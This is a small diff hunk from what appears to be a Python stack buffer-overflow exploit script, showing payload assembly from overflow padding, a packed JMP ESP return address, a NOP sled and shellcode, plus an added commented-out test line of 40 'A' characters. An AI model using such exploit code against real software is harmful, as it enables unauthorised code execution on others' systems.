@@ -43,6 +43,7 @@ espjmp=0x080414c3
 ret = struct.pack('<L', espjmp) 
 nopSled = '\x90' * 15
 payload = overflow + ret + nopSled + buf + '\n'
+#payload = "A" * 40
 
 espjmp2="0x080416bf"
 
